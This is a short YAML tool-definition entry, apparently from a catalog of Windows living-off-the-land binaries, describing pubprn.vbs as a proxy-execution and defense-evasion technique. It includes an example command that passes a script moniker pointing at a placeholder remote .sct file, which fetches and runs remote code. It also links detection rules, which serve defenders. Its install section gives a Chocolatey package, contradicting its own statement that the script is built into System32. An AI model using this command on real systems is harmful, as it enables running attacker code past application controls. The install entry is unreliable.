---
id: windows-execution-pubprn
namespace: windows:execution:pubprn
name: pubprn
description: 'Proxy execution with Pubprn.vbs Located at: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs;
  C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- pubprn
parameters: []
features:
- pipes-stdin
- pipes-stdout
- remote
execution:
  template: pubprn
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Set the 2nd variable with a Script COM moniker to perform Windows Script
    Host (WSH) Injection (Proxy execution)
  command: pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
references:
- label: ''
  url: https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
- label: windows-operating-system-archaeology
  url: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
- label: windows-operating-system-archaeology
  url: https://github.com/enigma0x3/windows-operating-system-archaeology
techniques:
- execution
- defense-evasion
mitre_ids:
- T1216.001
detections:
- type: blockrule
  url: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml
install:
- method: choco
  package_name: pubprn
  commands:
  - choco install pubprn
---

# pubprn

pubprn is a Windows LOLBin. Proxy execution with Pubprn.vbs Located at: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs; C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs.
